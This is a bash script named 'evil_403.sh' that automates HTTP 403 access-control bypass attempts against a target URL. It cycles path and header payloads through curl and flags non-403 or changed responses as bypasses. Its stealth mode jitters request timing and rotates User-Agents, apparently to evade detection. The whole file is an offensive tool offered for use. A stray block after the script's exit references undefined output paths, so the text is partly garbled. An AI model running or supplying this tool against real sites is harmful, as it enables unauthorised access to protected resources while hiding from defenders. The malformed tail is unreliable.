#!/usr/bin/env bash
# evil_403.sh — Stealth-grade 403 bypass automation wrapper

# ----------------------------
# Banner
# ----------------------------
cat << "EOF"
                                                                              
@@@@@@@@  @@@  @@@  @@@  @@@                       @@@    @@@@@@@@   @@@@@@   
@@@@@@@@  @@@  @@@  @@@  @@@                      @@@@   @@@@@@@@@@  @@@@@@@  
@@!       @@!  @@@  @@!  @@!                     @@!@!   @@!   @@@@      @@@  
!@!       !@!  @!@  !@!  !@!                    !@!!@!   !@!  @!@!@      @!@  
@!!!:!    @!@  !@!  !!@  @!!       @!@!@!@!@   @!! @!!   @!@ @! !@!  @!@!!@   
!!!!!:    !@!  !!!  !!!  !!!       !!!@!@!!!  !!!  !@!   !@!!!  !!!  !!@!@!   
!!:       :!:  !!:  !!:  !!:                  :!!:!:!!:  !!:!   !!!      !!:  
:!:        ::!!:!   :!:   :!:                 !:::!!:::  :!:    !:!      :!:  
 :: ::::    ::::     ::   :: ::::                  :::   ::::::: ::  :: ::::  
: :: ::      :      :    : :: : :                  :::    : : :  :    : : :   
                                                                              

              EVIL-403
EOF

echo "Author: Samael_0x4"
echo


# Usage example:
# ./evil_403.sh -u https://target.com --payload-path 403_path_payloads.txt --payload-header 403_header_payloads.txt --stealth --ua-rotate --delay 0.3

set -o errexit -o nounset -o pipefail

### Colors
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; BLUE='\033[0;34m'; NC='\033[0m'

### Defaults
USER_AGENT="evil-403/2.0 (+https://github.com/samael0x4/Evil-403)"
CURL_TIMEOUT=15
STEALTH=0
DELAY=0.2        # base delay (seconds) between requests
UA_ROTATE=0

### minimal UA pool for rotation (used when --ua-rotate)
UA_POOL=(
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15"
  "curl/7.85.0"
  "Wget/1.21.1 (linux-gnu)"
)

### required commands
REQUIRED=(curl mktemp sha256sum awk sed printf sleep date head)
missing=()
for cmd in "${REQUIRED[@]}"; do
  if ! command -v "$cmd" >/dev/null 2>&1; then
    missing+=("$cmd")
  fi
done
if (( ${#missing[@]} )); then
  printf '%b\n' "${RED}[ERROR] Missing commands:${NC} ${missing[*]}" >&2
  exit 2
fi

### Helpers
usage() {
  cat <<EOF
Usage: $0 -u <url> --payload-path <path_file> --payload-header <header_file> [options]

Options:
  -u, --url <url>                  Target URL (scheme optional; https:// will be prepended if missing)
  --payload-path <file>            Path payloads file (one path per line, e.g. /admin)
  --payload-header <file>          Header payloads file (one header per line, exact "Header: value")
  -s, --stealth                     Enable stealth mode (slower, jittered requests)
  --delay <seconds>                Base delay between requests (default: ${DELAY})
  --ua-rotate                      Rotate User-Agent per request (uses small UA pool)
  -h, --help                       Show this help
Example:
  $0 -u https://target.com --payload-path 403_path_payloads.txt --payload-header 403_header_payloads.txt --stealth --ua-rotate
EOF
  exit 1
}

normalize_url() {
  local u="$1"
  if [[ "$u" =~ ^(file|ftp|data): ]]; then
    echo "Invalid scheme" >&2; return 1
  fi
  if ! [[ "$u" =~ ^https?:// ]]; then
    u="https://$u"
  fi
  # remove trailing slash (keep root as e.g. https://example.com)
  u="${u%/}"
  printf '%s' "$u"
}

rand_sleep() {
  # base delay in $DELAY, plus jitter when STEALTH=1
  local base="$1"
  if [[ "$STEALTH" -eq 1 ]]; then
    # jitter between 0 and base*1.5
    local jitter
    jitter=$(awk "BEGIN{printf \"%.3f\", ($RANDOM/32768) * ($base * 1.5)}")
    sleep_time=$(awk "BEGIN{printf \"%.3f\", $base + $jitter}")
  else
    sleep_time="$base"
  fi
  # use sleep with fractional seconds
  sleep "$sleep_time"
}

choose_ua() {
  if [[ "$UA_ROTATE" -eq 1 ]]; then
    local idx=$((RANDOM % ${#UA_POOL[@]}))
    printf '%s' "${UA_POOL[$idx]}"
  else
    printf '%s' "$USER_AGENT"
  fi
}

http_request() {
  # args: method url out_prefix header1 header2 ...
  local method="$1"; shift
  local url="$1"; shift
  local outpref="$1"; shift
  local headers=("$@")
  local hdrfile="${outpref}.hdr"; local bodyfile="${outpref}.body"

  local ua
  ua="$(choose_ua)"

  # construct curl args safely
  local -a CURL=(--silent --show-error --location --max-time "$CURL_TIMEOUT" -A "$ua" -X "$method" --dump-header "$hdrfile" --write-out "%{http_code}" -o "$bodyfile" "$url")
  for h in "${headers[@]}"; do
    # header lines might be quoted in file; trim quotes if present
    h=$(printf '%s' "$h" | sed -e 's/^"\(.*\)"$/\1/' -e "s/^'\(.*\)'$/\1/")
    CURL+=( -H "$h" )
  done

  curl "${CURL[@]}"
}

sha256_of_file() {
  local f="$1"
  if [[ -f "$f" ]]; then
    sha256sum "$f" | awk '{print $1}'
  else
    printf ''
  fi
}

print_info(){ printf '%b\n' "${BLUE}[INFO]${NC} $*"; }
print_warn(){ printf '%b\n' "${YELLOW}[WARN]${NC} $*"; }
print_err(){ printf '%b\n' "${RED}[ERROR]${NC} $*"; }
print_403(){ printf '%b\n' "${RED}[403]${NC} $*"; }
print_bypass(){ printf '%b\n' "${GREEN}[BYPASS]${NC} $*"; }

### CLI parse (support long options)
if (( $# == 0 )); then usage; fi
# temp holders
TARGET_RAW=""
PATH_FILE=""
HEADER_FILE=""
while (( $# )); do
  case "$1" in
    -u|--url) TARGET_RAW="$2"; shift 2;;
    --payload-path) PATH_FILE="$2"; shift 2;;
    --payload-header) HEADER_FILE="$2"; shift 2;;
    -s|--stealth) STEALTH=1; shift;;
    --delay) DELAY="$2"; shift 2;;
    --ua-rotate) UA_ROTATE=1; shift;;
    -h|--help) usage;;
    *) printf '%b\n' "${YELLOW}[WARN] Unknown option: $1${NC}"; shift;;
  esac
done

if [[ -z "$TARGET_RAW" || -z "$PATH_FILE" || -z "$HEADER_FILE" ]]; then
  print_err "Missing required args."
  usage
fi

if [[ ! -f "$PATH_FILE" ]]; then print_err "Path payload file not found: $PATH_FILE"; exit 2; fi
if [[ ! -f "$HEADER_FILE" ]]; then print_err "Header payload file not found: $HEADER_FILE"; exit 2; fi

TARGET="$(normalize_url "$TARGET_RAW")" || { print_err "Bad URL"; exit 1; }
print_info "Target: $TARGET"
print_info "Payloads: paths=$PATH_FILE headers=$HEADER_FILE"
print_info "Stealth: $STEALTH  UA-rotate: $UA_ROTATE  base-delay: $DELAY s"

### prep tmpdir
TMPDIR="$(mktemp -d "${PWD}/evil403.XXXX")"
cleanup() { local rc=$?; print_info "Cleaning up (kept evidence at $TMPDIR if you used --no-clean)"; exit $rc; }
trap cleanup EXIT

# capture baseline of the root (non-path) to compare bodies
print_info "Capturing baseline content for $TARGET ..."
basepref="${TMPDIR}/base_$(date +%s%N)"
status_base="$(http_request GET "$TARGET" "$basepref")" || status_base="000"
base_body="${basepref}.body"
BASE_HASH="$(sha256_of_file "$base_body")"
print_info "Baseline status: $status_base  sha256:$BASE_HASH"

found_any_bypass=0

# read payload files into arrays (trim blank lines and comments)
mapfile -t PATHS < <(sed -e 's/#.*//' -e '/^\s*$/d' "$PATH_FILE")
mapfile -t HEADERS < <(sed -e 's/#.*//' -e '/^\s*$/d' "$HEADER_FILE")

# main loop: for each path -> test path itself, then for each header perform request
for p in "${PATHS[@]}"; do
  # ensure path starts with /
  if [[ "$p" != /* ]]; then p="/$p"; fi
  candidate="${TARGET}${p}"
  print_info "Probing path: $candidate"

  # first: simple GET without special headers
  outp="${TMPDIR}/attempt_$(date +%s%N)"
  status="$(http_request GET "$candidate" "$outp")" || status="000"
  body="${outp}.body"
  hdr="${outp}.hdr"
  hash="$(sha256_of_file "$body")"

  if [[ "$status" == "403" ]]; then
    print_403 "$candidate -> 403"
  else
    # if not 403 and body differ from baseline, mark as accessible
    if [[ -n "$BASE_HASH" && "$hash" != "$BASE_HASH" ]]; then
      print_bypass "$candidate -> $status (body differs from baseline)"
      cp "$body" "${TMPDIR}/evidence_$(echo "$candidate" | sed 's/[^a-zA-Z0-9]/_/g')_body"
      cp "$hdr"  "${TMPDIR}/evidence_$(echo "$candidate" | sed 's/[^a-zA-Z0-9]/_/g')_hdr"
      found_any_bypass=1
    else
      print_info "$candidate -> $status"
    fi
  fi

  # stealth delay between path baseline and header permutations
  rand_sleep "$DELAY"

  # Now iterate through *all* header payloads for this path
  for hdr_line in "${HEADERS[@]}"; do
    # header file lines should be full header lines: Header: value
    outp="${TMPDIR}/attempt_hdr_$(date +%s%N)"
    status_h="$(http_request GET "$candidate" "$outp" "$hdr_line")" || status_h="000"
    body_h="${outp}.body"; hdr_h="${outp}.hdr"; hash_h="$(sha256_of_file "$body_h")"

    # consider bypass if status != 403 OR body hash differs from baseline
    if [[ "$status_h" != "403" || ( -n "$BASE_HASH" && "$hash_h" != "$BASE_HASH" ) ]]; then
      # sanitize header for filename
      safehdr="$(echo "$hdr_line" | sed 's/[^a-zA-Z0-9]/_/g')"
      print_bypass "$candidate + header[$hdr_line] -> $status_h"
      cp "$body_h" "${TMPDIR}/evidence_$(echo "$candidate" | sed 's/[^a-zA-Z0-9]/_/g')_${safehdr}_body"
      cp "$hdr_h"  "${TMPDIR}/evidence_$(echo "$candidate" | sed 's/[^a-zA-Z0-9]/_/g')_${safehdr}_hdr"
      found_any_bypass=1
    else
      print_info "$candidate + header[$hdr_line] -> $status_h (no bypass)"
    fi

    # stealth delay between header permutations
    rand_sleep "$DELAY"
  done

done

# Final summary
if (( found_any_bypass )); then
  print_bypass "One or more bypasses detected. Evidence saved in: $TMPDIR"
  ls -1 "$TMPDIR" || true
  exit 0
else
  print_info "No bypass discovered with provided payloads. Evidence saved in: $TMPDIR"
  ls -1 "$TMPDIR" || true
  exit 3
fi


  - Bypass results:     ${OUTDIR}/bypass/
  - Validation success: ${OUTDIR}/validation/success.txt
  - Evidence headers:   ${OUTDIR}/evidence/headers_*.txt
  - Evidence bodies:    ${OUTDIR}/evidence/responses/"
